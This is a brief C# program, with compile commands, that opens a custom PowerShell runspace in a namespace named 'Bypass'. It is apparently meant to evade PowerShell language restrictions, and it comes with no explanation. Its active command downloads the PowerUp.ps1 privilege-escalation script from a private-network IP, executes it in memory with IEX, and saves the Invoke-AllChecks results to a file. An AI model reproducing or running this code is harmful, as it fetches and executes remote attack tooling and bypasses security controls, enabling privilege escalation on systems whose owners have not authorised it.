csc /r:Growl.Connector.dll,Growl.CoreLibrary.dll /out:test.exe *.cs
C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe /reference:system.management.automation.dll /target:exe /out:E:\foo.exe /E:\foo.cs



using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.95/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();

        }
    }
}
